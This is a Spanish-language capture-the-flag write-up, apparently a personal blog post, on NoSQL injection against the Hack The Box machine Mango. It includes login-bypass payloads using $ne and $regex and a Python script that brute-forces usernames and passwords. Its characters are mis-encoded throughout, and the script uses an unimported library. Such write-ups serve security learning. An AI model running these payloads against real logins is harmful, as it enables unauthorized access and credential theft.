I"∑#<h2 id="explicaci√≥n-te√≥rica">Explicaci√≥n te√≥rica</h2>

<p>En alguna ocasi√≥n, y muy de refil√≥n, hab√≠a tenido que lidiar con bases de datos NoSQL para alguna cosa muy sencilla y puntual. Sin embargo, en cuestiones de seguridad, nunca me hab√≠a topado con ellas.</p>

<p>No voy a explicar aqu√≠ lo que son las archiconocidas inyecciones SQL porque esto s√≥lo pretende ser una nota personal y/o idea para una futura pr√°ctica, adem√°s de haber documentaci√≥n a paladas en Internet para enterarse.</p>

<p>La idea principal es que poniendo el ejemplo de un formulario de login, una vez introducidos usuario y contrase√±a, estos se verificar√°n contra la BBDD NoSQL (en nuestro caso MongoDB) tal y como podr√≠a suceder con una BBDD SQL. La diferencia obvia entre una inyecci√≥n SQL y una NoSQL es la gram√°tica y la sintaxis.</p>

<p>Puesto que las BBDD NoSQL no tienen un lenguaje estandarizado, haremos uso de algunos operadores para extraer informaci√≥n. Por ejemplo, en el caso que se comentaba de un formulario de login, podemos utilizar operadores como <code class="language-plaintext highlighter-rouge">$gt</code> (grater than, mayor que) o <code class="language-plaintext highlighter-rouge">$ne</code> (not equal, no igual a). As√≠ las cosas, en el ejemplo del login que coment√°bamos, suponiendo que la petici√≥n se realiza por POST y con DATA una forma de hacer un bypass de la autenticaci√≥n ser√≠a:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">username[$ne]=invent&amp;password[$ne]=invent
</span></code></pre></div></div>
<p>Si el usuario/password no es <code class="language-plaintext highlighter-rouge">√¨nvent</code> esta condici√≥n se cumple y habremos realizado el bypass de la autenticaci√≥n.</p>

<p>De la misma forma, usando estos operadores, as√≠ como otro dedicado a las expresiones regulares: <code class="language-plaintext highlighter-rouge">$regex</code>, podremos ir extrayendo informaci√≥n de la base de datos. Vamos a demostrar que podemos obtener tanto los usuarios en primera instancia, como el password a partir de ellos:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">username[$ne]=invent&amp;password[$regex]=r.*
</span></code></pre></div></div>

<p>Con esta sentencia, si el nombre de usuario no es <code class="language-plaintext highlighter-rouge">invent</code> y, adem√°s, el password cumple la expresi√≥n regular (que el valor de password empiece por r y vaya seguido de cualquier n√∫mero y tipo de car√°cteres), tendremos una respuesta positiva de alg√∫n modo.</p>

<p>La idea ser√≠a ir iterando a trav√©s de todas las letras y car√°cteres del alfabeto con el fin de ir ensamblando los valores que nos den respuesta positiva y que, finalmente, formar√°n el usuario/password que buscamos.</p>

<h2 id="caso-pr√°ctico">Caso pr√°ctico</h2>

<h3 id="authentication-bypass">Authentication bypass</h3>

<p>Veamos un caso pr√°ctico con la m√°quina Mango de Hack the box.</p>

<p>Tenemos una pantalla de login tal que as√≠:</p>

<p><img src="../img/nosqli/mango_login.png" alt="" /></p>

<p>Y el intento de login infructuoso, nos da como resultado una respuesta <code class="language-plaintext highlighter-rouge">200 OK</code></p>

<p><img src="../img/nosqli/1.png" alt="" /></p>

<p><img src="../img/nosqli/2.png" alt="" /></p>

<p>Sin embargo, utilizando el primer payload que hemos visto, obtenemos un <code class="language-plaintext highlighter-rouge">302 Found</code>, que en el navegador comprobamos que se corresponde con una respuesta positiva de la base de datos y, por ende, en aut√©ntico bypass de la autenticaci√≥n:</p>

<p><img src="../img/nosqli/3.png" alt="" /></p>

<h3 id="extracci√≥n-de-usuarios-y-contrase√±as">Extracci√≥n de usuarios y contrase√±as</h3>

<p>Para este caso, vamos a usar un script disponible en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-urlencoded-body">PayloadAllTheThings</a> pero ligeramente modificado para nuestras necesidades:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib3</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">urllib</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="n">username</span><span class="o">=</span><span class="s">""</span>
<span class="n">password</span><span class="o">=</span><span class="s">""</span>
<span class="n">u</span><span class="o">=</span><span class="s">"http://laquesea/"</span>
<span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'content-type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span> <span class="c1">#Si excluimos la a de todas las iteraciones y el user contiene la a... no lo sacar√°
</span>            <span class="n">payload</span><span class="o">=</span><span class="s">'username=%s&amp;password[$regex]=^%s&amp;login=login'</span> <span class="o">%</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">re</span><span class="p">.</span><span class="n">escape</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">))</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
               <span class="k">print</span><span class="p">(</span><span class="s">"Found one more char : %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span><span class="o">+</span><span class="n">c</span><span class="p">))</span>
               <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
</code></pre></div></div>
<p>Puesto que primero queremos extraer los usuarios, utilizaremos una inyecci√≥n que lo consiga mediante <code class="language-plaintext highlighter-rouge">$regex</code> en el username y un <code class="language-plaintext highlighter-rouge">$ne</code> que se cumpla en el campo password:</p>

<p><img src="../img/nosqli/8.png" alt="" /></p>

<p>Y vemos que el script funciona bien:</p>

<p><img src="../img/nosqli/9.png" alt="" /></p>

<p>Puede que haya m√°s usuarios, ahora lanzaremos el script de la misma forma pero excluyendo usuarios que empiecen por <code class="language-plaintext highlighter-rouge">a</code> (sino volver√≠a a salir <code class="language-plaintext highlighter-rouge">admin</code>):</p>

<p><img src="../img/nosqli/10.png" alt="" /></p>

<p><img src="../img/nosqli/11.png" alt="" /></p>

<p>Claro, el problema es que si excluimos la <code class="language-plaintext highlighter-rouge">a</code> de la iteraci√≥n, si el nuevo nombre de usuario la contiene, no la encontrar√° y no podr√° seguir extrayendo el username. Sabiendo ya que el nuevo usuario empieza por <code class="language-plaintext highlighter-rouge">m</code>, actuamos en consecuencia:</p>

<p><img src="../img/nosqli/12.png" alt="" /></p>

<p><img src="../img/nosqli/13.png" alt="" /></p>

<p>Teniendo ya los nombres de usuario, vamos a obtener sus contrase√±as haciendo uso de ellos, utilizando esta vez la  inyecci√≥n el el campo password:</p>

<p><img src="../img/nosqli/14.png" alt="" /></p>

<p><img src="../img/nosqli/15.png" alt="" /></p>

<p><img src="../img/nosqli/16.png" alt="" /></p>

<p><img src="../img/nosqli/17.png" alt="" /></p>

<p>Y esta es una explicaci√≥n b√°sica, sencilla y somera de las nociones de inyecciones NoSQL.</p>

<p>Tambi√©n existe la opci√≥n, un poco menos c√≥moda pero m√°s sencilla, de realizar este proceso con <a href="https://rioasmara.com/2020/08/13/nosql-injection-and-bruteforce/">Burp Suite</a></p>

:ET